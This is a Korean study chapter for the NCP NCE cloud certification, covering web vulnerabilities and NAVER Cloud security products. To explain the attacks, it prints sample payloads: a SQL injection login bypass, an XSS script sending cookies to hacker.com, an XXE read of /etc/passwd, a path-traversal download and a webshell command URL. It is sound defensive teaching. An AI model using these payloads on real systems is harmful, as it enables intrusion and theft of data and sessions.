---
title: "Chapter 23: 보안의 성벽 — 웹 취약점 & 보안 상품"
date: 2026-04-01 09:00:00 +0900
categories: [NCP, NCE]
tags: [ncp, nce, 자격증, security, waf, kms, private-ca, xss, sql-injection, ssrf, xxe, appsafer, file-safer, webshell, ids, ips, ddos, anti-ddos, certificate-manager, cloud-security-watcher]
description: "NCP NCE 자격증 대비 학습 자료 - 보안 위협 진화, AppSafer, File Safer, Web/OS/WAS Security Checker, WAF, KMS, Private CA, Webshell Behavior Detector, Cloud Security Watcher 총정리"
---
> **학습 목표**: 보안 위협의 진화 흐름, NCP 웹 보안 상품 아키텍처, AppSafer/File Safer/Security Checker의 작동 원리, 방화벽·IDS·IPS·WAF의 역할 구분, KMS 봉투 암호화, Private CA, Webshell Behavior Detector, Cloud Security Watcher를 완벽히 이해한다.

---

## 이야기: 해킹 시도를 막아라

클라우드빵집 결제 시스템에 이상한 로그가 찍히기 시작했다.

```
GET /search?q='; DROP TABLE orders; --
```

민준이 식겁했다.

> "SQL Injection이야! 누군가 DB를 날리려 했어!"

재현이 침착하게 말했다.

> "WAF 설정해야 해. 그리고 Web Security Checker로 전체 취약점 스캔도 해보자."

팀장이 덧붙였다.

> "그게 다가 아니야. 요즘 공격은 네트워크 레벨에서 막히던 IP Spoofing 같은 고전 기법은 사라지고, 애플리케이션 구조의 허점을 파고드는 방향으로 진화했어. 방화벽 하나로는 절대 못 막아."

---

## 🔑 핵심 개념 1: 보안 위협의 진화

> OCR 원문(p.235): "고전적인 IP Spoofing이나 Sniffing 공격은 네트워크 장비의 발전으로 점차 사라짐. 애플리케이션이나 시스템의 구조적인 허점을 이용하여 공격하는 방식으로 진화."

```
[보안 위협 진화 흐름]

과거: IP Spoofing, Sniffing (네트워크 레벨)
  → 네트워크 장비 발전으로 점차 사라짐

현재: 
  [시스템/네트워크 공격]
  DDoS, Brute Force 등의 Tool들이 더욱 강력해지고 교묘해짐
  OS의 보안 취약점이 지속적으로 발생

  [Application 공격]
  SQL Injection, XSS를 비롯한 애플리케이션 허점 이용 공격 지속 진화

  [관리자 PC 권한 취득]
  파밍, 스미싱, 피싱 등으로 관리자 PC 혹은 모바일 권한 취득
```

---

## 🔑 핵심 개념 2: NCP 웹 보안 상품 아키텍처 (⭐⭐ 최빈출!)

교과서 p.236에는 NCP 웹 서비스 보안 상품 전체 구성도가 나온다.

```
[NCP 웹 서비스 보안 상품 배치도]

인터넷 사용자 (Users)
    ↓
[SSL VPN] ← Admin/Dev 안전 접속
    ↓
[IDS / IPS / WAF] ← Appliance 형태로 Managed Security 제공
    ↓
[Anti-DDoS] ← 고객별 Dedicated 서비스
    ↓
[Load Balancer]
    ↓
[Security Checker] ← 앱/시스템/앱 분석, 취약점 진단 및 리포팅
    ↓
[ACG (Access Control Group)] ← Servers 앞단 접근 제어
    ↓
[Servers]

※ AppSafer: 앱/파일 등에서 발생하는 보안 위협을 진단하여 보호
```

| 상품 | 역할 |
|------|------|
| **SSL VPN** | 관리자/개발자 안전 접속 |
| **IDS/IPS/WAF** | 침입 탐지·방지, 웹방화벽 (Managed Security Appliance) |
| **Anti-DDoS** | DDoS 공격 전용 방어 (고객별 Dedicated) |
| **Load Balancer** | 트래픽 분산 |
| **Security Checker** | 취약점 진단 및 리포팅 |
| **ACG** | 서버 레벨 접근 제어 |
| **AppSafer** | 모바일 앱 보안 |

---

## 🔑 핵심 개념 3: 웹 취약점 유형 (⭐⭐ 최빈출!)

### SQL Injection

```
[SQL Injection 공격]

정상 쿼리:
SELECT * FROM users WHERE id='user' AND pw='1234'

공격 입력: id = ' OR '1'='1
악성 쿼리:
SELECT * FROM users WHERE id='' OR '1'='1' AND pw=''
→ '1'='1'은 항상 참! 모든 계정 접근 가능!
```

- **입력값에 SQL 코드를 삽입**하여 DB를 조작
- 데이터 유출·변조 외에도 서버에 파일을 쓰거나 읽고, 직접 명령 실행도 가능
- 방어: 입력값 검증, Prepared Statement, WAF

### XSS (Cross-Site Scripting)

```
[XSS 공격]

악성 스크립트를 게시판에 등록:
<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>

다른 사용자가 해당 페이지를 열면
→ 스크립트 실행 → 쿠키/세션 탈취!
```

- **악성 스크립트**를 웹페이지에 삽입, 다른 사용자 공격
- 사용자 정보(쿠키, 세션 등) 탈취 또는 비정상 기능 자동 수행
- 방어: 출력 시 HTML 인코딩, CSP 헤더

### SSRF (Server-Side Request Forgery)

```
[SSRF 공격]

공격자 → 서버에 요청: "이 URL 정보 가져와줘"
          URL = http://internal-server/admin (내부 주소!)
서버 → 내부 서버에 요청 (방화벽 우회!)
→ 내부 메타데이터, 비공개 API 접근 가능
```

- 사용자로부터 입력되는 데이터(도메인 등)에 대한 검증 절차 부족이 원인
- 보안 장비를 우회하고 방화벽 뒤쪽 내부 시스템으로 공격 트래픽 이어갈 수 있음
- 클라우드 환경에서 특히 위험 (메타데이터 서버 접근)

### XXE (XML External Entity)

```
[XXE 공격]

악성 XML 전송:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

→ 서버의 /etc/passwd 파일 내용이 응답에 포함됨!
```

- XML Request를 파싱하는 페이지에서 발생
- 사용자로부터 XML 데이터 전문을 받거나 DTD 정의가 가능한 경우 공격 가능
- 서버의 로컬 파일 열람, Denial of Service 유발 가능

### LFI / RFI (파일 인클루전)

```
[LFI - Local File Inclusion]
include(), require() 등에 사용자 입력 값을 그대로 전달
→ 웹 서버 내부의 악의적인 파일 Include → 임의 명령 실행

[RFI - Remote File Inclusion]
원격지 공격자 서버의 악성 파일을 Include
→ 동일한 방식으로 임의 명령 실행
```

### 파일 업로드/다운로드 취약점

```
[파일 업로드 공격]
악성 PHP 파일을 이미지로 위장하여 업로드
→ 웹쉘 업로드 → 서버 원격 제어!
업로드할 파일이 안전한지 검사하지 않아 발생

[파일 다운로드 공격]
다운로드 URL 파라미터 조작:
/download?file=../../etc/passwd
→ 시스템 파일 다운로드!
애플리케이션 로직에서 파일 다운로드 시 입력값 검증 미흡이 원인
```

### Command Injection

- 공격자가 서버에 직접 명령을 전달하고 실행할 수 있는 취약점
- 웹 애플리케이션에서 사용자 입력값을 시스템 함수에 사용할 때 검증이 미흡한 경우 발생

### 기타 Web Security Checker 점검 항목

| 취약점 | 설명 |
|--------|------|
| **Insufficient Authorization** | tomcat-admin, phpmyadmin, jenkins 등 관리 페이지 접근 통제 여부 |
| **Specific Vulnerabilities** | ShellShock(CVE-2014-6271) 등 특정 앱 알려진 취약점 |
| **Directory Listing** | 웹 서버 디렉터리 인덱싱으로 파일 목록 노출 |
| **Source Code Disclosure** | 스크립트 파일을 정상 처리 못해 소스코드 그대로 노출 |
| **Information Disclosure** | 서버 정보, 오류 메시지로 공격에 활용될 정보 노출 |
| **URL Redirection** | 의도하지 않은 페이지로 이동 (피싱 페이지 유도) |
| **Insecure SSL/TLS** | 취약한 SSL/TLS 버전 및 Cipher Suites 사용 → MITM 공격 가능 |
| **Mixed Content** | HTTP와 HTTPS 혼용 → 비암호화 콘텐츠 수집·변조 가능 |
| **File Management** | 웹 서버 운영에 불필요한 파일 미삭제 |

---

## 🔑 핵심 개념 4: AppSafer (모바일 앱 보호) (⭐⭐)

**AppSafer** = 고객의 앱 실행 모바일 환경에 대한 보안 위협 여부를 **실시간으로 탐지**하는 서비스.

### Android 앱 보호 기능

#### 난독화 (소스 코드 보호)
- Java 코드의 **클래스명, 메서드명**에 대한 난독화 및 **String 난독화**를 적용
- 보안 위협의 원인이 되는 코드 분석을 어렵게 함

#### 암호화
- **Dex, So, Unity 관련 바이너리를 암호화**
- 코드 분석을 위한 Decompile 행위를 방어

#### 실시간 환경 탐지
| 탐지 항목 | 설명 |
|---------|------|
| **루팅 탐지** | 사용자가 OS의 슈퍼유저 권한을 강제로 획득하는 루팅 행위 탐지 |
| **가상 머신 탐지** | 앱이 가상 머신에서 실행되는지 여부 탐지 |
| **디버깅 탐지** | 앱 프로세스에 접근하여 동적으로 분석하는 디버깅 행위 탐지 |
| **앱 변조 탐지** | 제3자에 의해 변조된 앱인지 여부 탐지 |
| **메모리 변조 탐지** | 제3자에 의한 메모리 변조 탐지 |
| **스피드 핵 탐지** | 제3자에 의한 시스템 시간 조작 행위 탐지 |

### iOS 앱 보호 기능
| 탐지 항목 | 설명 |
|---------|------|
| **탈옥 탐지** | OS 슈퍼유저 권한 강제 획득(탈옥) 행위 탐지 |
| **가상 머신 탐지** | 앱이 가상 머신에서 실행되는지 탐지 |
| **디버깅 탐지** | 앱 프로세스 접근하여 동적으로 분석하는 행위 탐지 |
| **우회 툴 탐지** | 탐지 기능을 우회하기 위한 우회 툴 탐지 및 상시 대응 |

### OS별 기능 지원 표

| 기능 | Android | iOS |
|------|:-------:|:---:|
| 난독화 | O | - |
| 암호화 | O | - |
| 루팅/탈옥 탐지 | O | O |
| 가상 머신 탐지 | O | O |
| 디버깅 탐지 | O | O |
| 비인가 서명 탐지 | O | O |
| 앱 변조 탐지 | O | O |
| 메모리 변조 탐지 | O | O |
| 스피드 핵 탐지 | O | - |
| 디버깅 방지 | O | O |
| 캡처 방지 | O | O |
| 안티바이러스·악성 앱 탐지 | O | - |
| 애플리케이션 관리(등록/삭제/변경 등) | O | O |
| 애플리케이션 제어(정지/실행) | O | O |
| 서비스 관리 콘솔 뷰어를 통한 보안 위협 탐지 통계 조회 | O | O |
| 애플리케이션 차단 정책 관리 | O | O |
| 애플리케이션 서명 관리 | O | O |

### AppSafer 적용 방법 (Android)

```
[Android APK 적용 흐름]

1. APK 업로드
   ↓
2. AppSafer 적용 (난독화, 암호화 등 설정)
   ↓
3. Protected APK 다운로드
   ↓
4. 마켓 배포
   ↓
5. Console을 통한 모니터링
```

- **iOS**: 패키지 기초 정보 입력 → 생성된 SDK 다운로드 → 개발에 포함 → 마켓 배포 → Console을 통한 모니터링

---

## 🔑 핵심 개념 5: File Safer (파일 악성코드 탐지)

**File Safer** = 업로드/다운로드되는 파일의 **악성코드 여부 탐지** 서비스. REST API 방식으로 연동.

### Hash Filter vs File Filter

| 구분 | Hash Filter | File Filter |
|------|------------|------------|
| **방식** | 파일에서 추출한 Hash 값으로 악성 여부 확인 | 파일 전체를 업로드하여 악성 여부 확인 |
| **속도** | 빠름 | 느림 (파일 전체 검사) |
| **사용 시점** | 1차 확인, 빠른 확인 | Hash Filter로 확인 안 되는 파일에 대해 사용 |

### Hash Filter 동작 흐름

```
[Hash Filter 방식]

이용자 → 회원사 서비스에 파일 업로드 (①)
         ↓
회원사 서비스 → 업로드된 파일의 Hash 추출 (②)
         ↓
         Hash 값으로 File 악성코드 감염 여부 질의 → HashSafer Filter (③)
         ↓
         Hash 값으로 악성코드 감염 여부 조회 결과 회신 (④)
         ↓
공격자의 악성코드 감염 파일 인입 차단 (⑤, 고객 선택)
```

### File Filter 동작 흐름

```
[File Filter 방식]

이용자 → 회원사 서비스에 파일 업로드 (①)
         ↓
회원사 서비스 → 악성코드 검사 요청 (파일 전송) (②)
         ↓
         악성코드 감염 여부 검사 → File(HashSafer Filter) (③)
         ↓
         악성코드 감염 여부 결과 요청 (④)
         ↓
         악성코드 감염 여부 결과 회신
         ↓
악성코드 감염 파일 차단 처리 (⑥, 고객 선택)
```

> **운용 전략**: 우선 파일을 전송하고 Hash Filter로 악성 여부 확인 → Hash 값 업데이트. File Filter에 업로드되면 악성코드 여부를 확인하고, 악성코드로 확인되는 경우 차단.

---

## 🔑 핵심 개념 6: Web Security Checker

**Web Security Checker** = 고객의 웹사이트 **보안 취약점 자동 진단** 서비스.

- 개인정보 유출 관련 웹 취약점 체크 (SQL Injection, XSS, LFI 등)
- 원하는 점검 항목만 선택 가능
- 취약점 진단뿐만 아니라 **대응 방안도 함께 제공**

### 점검 항목 (전체)

| 취약점 | 설명 요약 |
|--------|---------|
| **SQL Injection** | 입력값에 SQL 삽입 → DB 유출·변조·명령 실행 |
| **XSS** | 악성 스크립트 삽입 → 쿠키·세션 탈취 |
| **LFI** | 로컬 파일 Include → 임의 명령 실행 |
| **RFI** | 원격 악성 파일 Include → 임의 명령 실행 |
| **SSRF** | 서버를 통해 내부 시스템 공격 |
| **File Upload** | 악성 파일 업로드 → 서버 원격 제어 |
| **File Download** | 경로 탐색으로 서버 파일 다운로드 |
| **XXE** | XML External Entity → 로컬 파일 열람 |
| **Command Injection** | 서버에 직접 명령 전달·실행 |
| **Insufficient Authorization** | 관리 페이지 접근 통제 취약점 |
| **Specific Vulnerabilities** | ShellShock 등 알려진 취약점 |
| **File Management** | 불필요한 파일 미삭제 |
| **Directory Listing** | 디렉터리 인덱싱 → 파일 목록 노출 |
| **Source Code Disclosure** | 소스코드 그대로 노출 |
| **Information Disclosure** | 서버 정보·오류 메시지 노출 |
| **URL Redirection** | 의도하지 않은 페이지 이동 (피싱 유도) |
| **Insecure SSL/TLS** | 취약한 SSL/TLS 버전·Cipher Suites 사용 |
| **Mixed Content** | HTTP/HTTPS 혼용 |

---

## 🔑 핵심 개념 7: System Security Checker (OS Checker) (⭐⭐)

**System Security Checker** = OS(Linux, Windows) 설정에 대한 **보안 취약점 자동 점검** 서비스.

- 점검 필요 서버에 **Agent 설치** 후 간편하게 사용
- **3가지 점검 가이드** 기준: 주요정보통신기반시설 / 전자금융기반시설 / CSAP
- NAVER의 보안 설정 정책에 근거하여 취약점 점검 및 수정 가이드 제공

### Linux 주요 점검 항목

```
점검 대상 파일:
- /etc/passwd, /etc/shadow : UID 체크, 관리자 그룹 포함 계정 체크, 쉘 권한 점검
- /etc/security/pwquality.conf : 계정 패스워드 정책 점검
- /etc/ssh/sshd_config : SSH 접속 설정 점검
- /etc/pam.d/system-auth : 로그인 실패 임계값 설정
- /etc/profile : 환경 변수 점검
- 중요 파일 퍼미션 점검
```

| 점검 항목 | 기준 | 이유 |
|---------|------|------|
| **root 계정 원격 접속** | 제한 | root 탈취 방지, su 명령으로 전환 권장 |
| **/etc/shadow** | **400** | 관리자 권한만 읽기 허용, 패스워드 해시 보호 |
| **root 제외 UID 0 계정** | 삭제 | UID 0 = root와 동일 권한 |
| **Password 최소 길이** | **8자리 이상** | Brute Force / Password Guessing 방어 |
| **Password 최장 사용 기간** | 주기적 변경 정책 | 노출된 패스워드로 지속 공격 방지 |
| **관리자 그룹 계정** | 최소한으로 유지 | 불법 접근·파일 수정 방지 |
| **동일 UID 사용** | 금지 | 감사 추적 불가, 동일 사용자로 인식 문제 |
| **Session Timeout** | 설정 | 방치된 세션 통한 악의적 사용 방지 |
| **UMASK** | **027** 또는 **022** | 새 파일 기본 권한 |
| **Anonymous FTP** | 비활성화 | 익명 접속으로 시스템 정보 유출 방지 |
| **중요 파일 퍼미션 644** | `/etc/passwd`, `/etc/hosts`, `/etc/(x)inetd.conf`, `/etc/syslog.conf`, `/etc/services` | 소유자 읽기+쓰기, 나머지 읽기만 |
| **중요 파일 퍼미션 400** | `/etc/shadow`, `/etc/gshadow` | 소유자만 읽기 |
| **중요 파일 퍼미션 600** | `/etc/hosts.lpd` | 소유자만 읽기+쓰기 |
| **cron 파일 퍼미션 644** | `/etc/cron.allow`, `/etc/cron.deny` | 소유자만 수정 가능 |

### Windows 주요 점검 항목

| 점검 항목 | 기준 |
|---------|------|
| **Administrator 계정 이름 바꾸기** | 기본 이름 사용 시 Brute Force 공격 표적 |
| **Guest 계정** | 사용 제한 |
| **계정 잠금 임계값** | 로그인 실패 횟수 제한 (DoS 공격 가능성도 고려) |
| **"해독 가능한 암호화로 암호 저장"** | 사용 안 함 |
| **패스워드 복잡성** | 문자/숫자/특수문자 포함 (최소 8자 → 218조 이상 조합 가능) |
| **최소 암호 길이** | **8자 이상** 권고 |
| **최대/최소 암호 사용 기간** | 주기적 변경 유도 |
| **최근 암호 기억** | 이전 암호 재사용 방지 |
| **마지막 사용자 이름 표시** | 안 함 (공격자의 계정명 획득 방지) |
| **빈 암호 사용 제한** | 원격 로그온 시 빈 암호 계정 사용 금지 |
| **불필요한 서비스 제거** | IIS, FTP, SNMP 등 미사용 서비스 중지 |
| **Telnet 보안** | **NTLM 인증만 사용** (Password 인증 금지 — 평문 전송 위험) |
| **LAN Manager 인증 수준** | **NTLMv2 사용** 권장 (LM, NTLMv1 보다 안전) |
| **이벤트 로그 최대 크기** | **10,240 KB 이상** |
| **이벤트 로그 관리** | "이벤트 겹쳐쓰지 않음" 설정 |

> ⚠️ **시험 포인트**: Windows = **NTLMv2** 사용 권고! / `/etc/shadow` = **400** / `/etc/passwd` = **644**

---

## 🔑 핵심 개념 8: System Security Checker (WAS Checker)

**WAS Security Checker** = 웹 서버/WAS(Apache, Tomcat, Nginx) 설정에 대한 **보안 취약점 점검**.

- 점검 필요 서버에 Agent 설치 후 간편하게 사용
- 3가지 점검 가이드 기준: 주요정보통신기반시설 / 전자금융기반시설 / CSAP

### Apache 주요 점검 항목

| 항목 | 내용 |
|------|------|
| **log_config_module** | 사용 권장 (유연한 로깅 제공) |
| **webdav_module** | 사용 금지 (파일 무단 수정 위험) |
| **status_module** | 사용 금지 (서버 성능 정보 노출) |
| **autoindex_module** | 사용 금지 (디렉터리 내용 자동 생성) |
| **proxy module** | 사용 금지 (프록시 오용 방지) |
| **userdir module** | 사용 금지 (tilde로 홈 디렉터리 접근 차단) |
| **info_module** | 사용 금지 (서버 설정 정보 노출) |
| **Apache User/Group** | root 아닌 별도 사용자/그룹으로 실행 |
| **루트 디렉터리 접근 제어** | `Order deny,allow` + `Deny from all` |
| **AllowOverride** | `none` 설정 (.htaccess 무시) |
| **Options** | `none` 설정 (최소 권한 정책) |
| **기본 콘텐츠** | server-status, server-info, perl-status 제거 |
| **HTTP TRACE** | 사용 금지 |
| **LogLevel** | `notice` 권장 |
| **ServerTokens** | `Prod` 또는 `ProductOnly` (버전 정보 최소화) |
| **ServerSignature** | `off` (오류 페이지 서명 정보 제한) |
| **KeepAlive** | `On` 권장 |
| **MaxKeepAliveRequests** | `100 이상` |
| **Timeout** | `10 이하` |
| **KeepAliveTimeout** | `15초 이하` |
| **ssl_module (mod_ssl)** | 설치하여 SSL/TLS 트래픽 암호화 |

### Tomcat 주요 점검 항목

| 항목 | 내용 |
|------|------|
| **기본 파일 제거** | 기본 제공 앱, 설명문서, 기타 디렉터리 삭제 |
| **server.info / server.number / server.built** | 서버 정보 노출 방지를 위해 문자열 변경 |
| **X-Powered-By HTTP Header** | `xpoweredBy=false` 설정 |
| **StackTraces** | 디버그 정보 외부 노출 제한 |
| **HTTP TRACE** | 사용 금지 |
| **Shutdown 옵션** | `nondeterministic` 값 설정 |
| **Shutdown port (8005)** | 사용 금지 |
| **$CATALINA_HOME 접근 제한** | 소유권 `tomcat_admin:tomcat`, world(o-rwx) 금지 |
| **$CATALINA_BASE 접근 제한** | 동일하게 접근 제한 |
| **conf/, logs/, temp/, bin/, webapps/ 접근 제한** | 로컬 사용자 무단 변경 방지 |
| **설정 파일 접근 제한** | catalina.policy, catalina.properties, context.xml, logging.properties, server.xml, tomcat-users.xml, web.xml |
| **안전하지 않은 Realms** | MemoryRealm, JDBCRealm, UserDatabaseRealm, JAASRealm 사용 금지 |
| **LockOutRealm** | 사용 (로그인 실패 반복 시 잠금 → Brute Force 방지) |
| **clientAuth** | `true` 설정 (클라이언트 인증서 인증) |
| **SSLEnabled / secure** | `true` 설정 |
| **sslProtocol** | `TLS` 사용 (SSLv1, SSLv2 금지) |
| **SecurityManager** | 사용 (샌드박스 실행) |
| **autoDeploy** | 사용 금지 (악성 앱 자동 배포 방지) |
| **deployOnStartup** | 사용 금지 |
| **RECYCLE_FACADES** | `true` 설정 (세션 간 정보 유출 방지) |
| **ALLOW_BACKSLASH** | 사용 금지 |
| **ALLOW_ENCODED_SLASH** | 사용 금지 |
| **USE_CUSTOM_STATUS_MSG_IN_HEADER** | 사용 금지 (XSS 가능성) |
| **enableLookups** | `false` (DNS lookup 추가 오버헤드 방지) |

### Nginx 주요 점검 항목

| 항목 | 내용 |
|------|------|
| **버퍼 오버플로우 방지** | `client_body_buffer_size`, `client_header_buffer_size`, `client_max_body_size`(100K 이상), `large_client_header_buffers` 설정 |
| **버전 정보 삭제** | `server_tokens off` |
| **Slow HTTP DoS 방지** | `client_body_timeout`, `client_header_timeout`, `keepalive_timeout`, `send_timeout` 설정 |
| **SSL/TLS** | SSLv2, SSLv3 사용 금지, TLS 권장 |
| **BEAST 공격 차단** | 서버 사이드 암호 선호도 설정 |
| **안전하지 않은 암호 방식 금지** | Triple DES 등 취약한 암호화 사용 금지 |
| **클릭재킹 방지** | HSTS 헤더 설정 |
| **content-type 스니핑 차단** | `nosniff` 옵션 |
| **XSS 필터** | `X-XSS-Protection` 설정 |
| **안전한 SSL 보안** | `Strict-Transport-Security` 헤더 추가 (SSL stripping 방지) |

> **Lab 16**: OS/WAS Security Checker (Demo) — OS Security Checker로 점검 → WAS Security Checker로 점검

---

## 🔑 핵심 개념 9: 보안 장비 역할 구분 (⭐⭐ 최빈출!)

```
[보안 대응 범위 - 레이어별]

웹 애플리케이션 ← WAF (block)
웹 서버 소프트웨어 ← IPS/IDS (block)
서버 OS ← IPS/IDS
네트워크 ← Firewall (F/W)
```

### 방화벽 (Firewall)

```
[방화벽]
접속할 포트 및 IP 주소 제한
→ 공개 포트만 허용, 비공개 포트 차단
```

### IDS (침입 탐지 시스템)

```
[IDS]
방화벽으로 막을 수 없는 불법적인 통신 탐지 (DDoS 등)
방화벽 → 패킷 검사 → IDS
→ 공개 포트에서 오가는 비정상 통신 탐지 (차단 X)
```

### IPS (침입 방지 시스템)

```
[IPS]
네트워크에서 위협을 탐지하면 자동으로 차단
→ 정상 접근: 통과 / 비정상 접근: 차단
```

### WAF (Web Application Firewall)

```
[WAF]
웹 애플리케이션으로 전송되는 요청 정보를 분석하여
부정한 정보가 포함되지 않았는지 확인

※ 비밀번호 입력, 웹 폼 정보는 네트워크상에서
  "문제없는 통신"으로 취급되어
  무차별 대입 공격이나 SQL Injection은 방화벽에서 탐지 불가
→ WAF가 이를 담당 (L7 레벨에서 내용 분석)
```

| 장비 | 역할 | 계층 |
|------|------|------|
| **Firewall** | IP/Port 기반 패킷 필터링 | L3/L4 |
| **IDS** | 침입 **탐지** (알림만, 차단 X) | - |
| **IPS** | 침입 **탐지 + 차단** | - |
| **WAF** | 웹 공격 차단 (SQL Injection, XSS 등 L7 분석) | L7 |

> ⚠️ **IDS vs IPS**: IDS = 탐지만 / IPS = 탐지 + 차단

### Security Monitoring 서비스 구성 (Basic vs Managed)

| 서비스 | Basic | Managed |
|--------|-------|---------|
| **IDS** | 기본 탐지 Rule 적용 | 고객별 탐지 Rule 생성, 예외 처리, 집중 모니터링, 주간/월간 보고서 |
| **Anti-DDoS** | - | DDoS 자동 탐지/차단, 방어 대응 보고서, 주간/월간 보고서 (Public IP 및 Load Balancer 사용자에 한해 사용 가능) |
| **WAF** | 미제공 | 차단 보고서, 주간/월간 보고서 |
| **Anti-Virus** | Windows OS 서버 백신 기본 제공 (Classic 환경만), 실시간 악성코드 감시, 스케줄링 감시 | 바이러스·스파이웨어 격리/삭제, 최신 패턴 자동 업데이트, 주간/월간 보고서 |
| **IPS** | 미제공 | 주간/월간 보고서, 침해 서버 분석 |
| **침해 사고 기술 지원** | 미제공 | 시스템 분석 등 침해 내용 및 원인 분석 |

---

## 🔑 핵심 개념 10: KMS (Key Management Service) (⭐⭐)

**KMS** = 암호화에 사용되는 키를 보다 편리하고 안전하게 관리하는 서비스.

- 공개 키와 비밀 키를 KMS의 마스터 키로 암호화하여 키와 데이터를 안전하게 보호
- KMS의 마스터 키는 고객이 KMS를 통해 생성하며, **키 값은 직접 확인 불가**
- 루트 키는 KMS에서 마스터 키와 데이터 키를 암호화

### 봉투 암호화 (Envelope Encryption)

```
[Envelope Encryption 구조]

루트 키 (NCP 관리, KMS 내부, 절대 외부 노출 X)
    ↓ 암호화
마스터 키 (Customer Master Key - CMK, 고객이 KMS를 통해 생성)
    ↓ 암호화
데이터 키 (실제 데이터 암호화에 사용)
    ↓ 암호화
실제 데이터 (Data)

← 고객 관리 영역 (마스터 키 ~ 데이터) →
```

| 키 종류 | 관리 주체 | 역할 |
|--------|---------|------|
| **루트 키** | NCP 관리 | 최상위 키, 외부 노출 절대 불가 |
| **마스터 키 (CMK)** | 고객이 KMS 통해 생성 | 데이터 키 암호화 |
| **데이터 키** | 자동 생성 | 실제 데이터 암호화 |

> 데이터를 암호화하고, 암호화에 사용된 키를 NCP에서 제공하는 키(마스터 키)로 암호화하여 보호 — 이것이 전자 봉투(Envelope Encryption).

> ⚠️ **봉투 암호화**: 키를 키로 암호화하는 중첩 구조!

---

## 🔑 핵심 개념 11: Certificate Manager (인증서 관리)

**Certificate Manager** = SSL 인증서 등록 및 관리의 통합 서비스.

| 기능 | 내용 |
|------|------|
| **NCP 연계 상품 연동** | Load Balancer, Image Optimizer에서 사용할 인증서를 등록 (등록 시 인증서 유효성 체크) |
| **만료 알람** | 인증서의 만료 예정일 **한 달 전**부터 정기적으로 알람 메일과 SMS 발송 |
| **자동 갱신** | DNS 검증 방식으로 발급한 인증서를 유효 기간 만료 전에 자동으로 발급하고 사용 중인 인스턴스에 갱신 |
| **인증서 정보 제공** | 발급 기관, 대상 도메인, 하위 도메인, 유효 기간 등 다양한 정보 제공 |
| **인증서 발급** | 신뢰할 수 있는 인증 기관인 **NAVER Cloud Trust Services**에서 인증서 발급 |

> **Lab 17**: Certificate Manager 인증서 발급 → 로드 밸런서에 인증서 사용 → 로드 밸런서 리다이렉션 추가

---

## 🔑 핵심 개념 12: Private CA (사설 인증기관)

**Private CA** = 사설 인증서 발급 및 관리 시스템.

- 내부 서버 간 통신에 사용할 수 있는 사설 인증서 발급 및 관리 서비스
- SSL/TLS 인증 절차는 **X.509 표준** 준수
- **계정당 최대 10개의 CA와 30,000개의 인증서** 발급 가능

```
[Private CA 구조]

Root CA
    └─ Intermediate CA 1
        └─ End Entity 인증서 (서버 인증서)
    └─ Intermediate CA 2
        └─ End Entity 인증서

CA 생성 시 타입 선택: 루트 CA 또는 중간 CA
키 타입: RSA2048 / RSA4096 / EC256 / EC521
```

### CA 비밀키 보안

- Private CA의 비밀 키는 **KMS(Key Management System)와 동일한 시스템 내부**에서 자동 생성되어 안전하게 보관
- KMS는 키를 이용한 모든 기능이 **봉인(Sealing)**되어 있어, 내부 관리자라 하더라도 철저하게 접근 제어
- Private CA 외부로 **추출(Export) 불가능**하며, 외부에서 생성된 비밀 키를 임의 주입(Import)하는 것도 불가능

### CA 정보 URL (사설 인증서에 포함되는 URL 포인트)

| 항목 | 설명 |
|------|------|
| **발급자 체인 (Issuer Chain)** | CA 자신을 포함해 계층적으로 구성된 상위 CA 인증서 모두를 리스트로 제공 (기본 포함) |
| **인증서 폐기 목록 (CRL)** | 유효 기간 만료 외 폐기된 인증서 목록. 주기적 갱신으로 유효성 검증 (기본 포함) |
| **온라인 인증서 상태 프로토콜 (OCSP)** | CRL 직접 다운로드 없이 인증서 상태를 빠르게 조회. Private CA는 기본 제공, 필요 시 활성화하여 인증서에 포함 가능 |

| 항목 | 제한 |
|------|------|
| **최대 CA 수** | **10개** |
| **최대 인증서 발급 수** | **30,000개** |

> Private CA = 사내 내부 서비스용 인증서 발급 (공인 CA 비용 절감)

---

## 🔑 핵심 개념 13: Webshell Behavior Detector (⭐⭐)

**Webshell Behavior Detector** = 서버에 설치된 웹쉘(악성 스크립트)을 탐지하는 시스템.

> 웹쉘: 시스템 명령을 실행할 수 있는 쉘 기능을 웹사이트에서 이용할 수 있게 만든 서버 사이드 스크립트 코드. 시스템 파괴, 정보 유출 등 악의적 행위를 수행하기 위해 의도적으로 제작된 악성 코드.

```
[Webshell 공격 시나리오]

공격자 → 파일 업로드 취약점 이용
→ shell.php 업로드 성공
→ http://victim.com/uploads/shell.php 접근
→ 서버에서 명령어 실행 가능! (원격 제어)

웹쉘 실행 URL 예: webshell.php?cmd=cat%20/etc/hosts
```

### 주요 기능

| 기능 | 설명 |
|------|------|
| **행위 기반 실시간 웹쉘 탐지** | 웹 서버 내 발생하는 각종 데이터를 실시간으로 분석하여 웹쉘 행위를 실시간 판단 |
| **알려지지 않은 웹쉘 탐지** | 함수명·인자값 수정, 패킷 암호화, SSL 환경에서도 탐지. 완전히 새로운 웹쉘까지 탐지 가능 |
| **웹쉘 의심 행위 정보 및 이력 관리** | 탐지된 서버, 시간, 실행 명령어, 웹쉘 경로, 공격자 IP 등 정보 제공 |
| **파일 격리 / 복구** | NCP Console 화면에서 클릭 한 번으로 의심 파일 격리 또는 복구 |
| **웹쉘 의심 파일 목록 제공** | 의심 파일의 생성 시간, 파일 권한, 소유자, 그룹, 파일 경로, 사이즈 등 부가 정보 함께 제공 |
| **공격자 의심 IP 목록 제공** | 공격자로 의심되는 IP 및 국가 정보 제공 |
| **예외 규칙 설정** | 다양한 웹 서비스 환경에 맞게 상세한 예외 규칙 설정 기능 제공 |
| **알림 기능** | 실시간으로 탐지 내용을 E-mail 또는 SMS로 전달. 알림 인터벌 설정으로 과도한 알림 방지 |
| **에이전트 관리** | NCP Console에서 탐지 활성화/비활성화 가능 (원격 서버 접속 불필요) |
| **서버 그룹** | 웹 서버가 많은 경우 서버 그룹 기능으로 분류하여 간편하게 관리 |

### 탐지 방식

| 탐지 방식 | 설명 |
|---------|------|
| **에이전트 기반** | 서버에 Agent 설치 필요 |
| **행위 기반** | 패턴 매칭이 아닌 **비정상 행동** 탐지 |
| **실시간 탐지** | 웹쉘 실행 즉시 감지 |

### 웹쉘 추적 가이드

웹쉘 탐지 시 Access Log에서 다음 조건들을 확인:

1. 웹쉘이 탐지된 시점에 접근한 파일들을 웹쉘로 의심
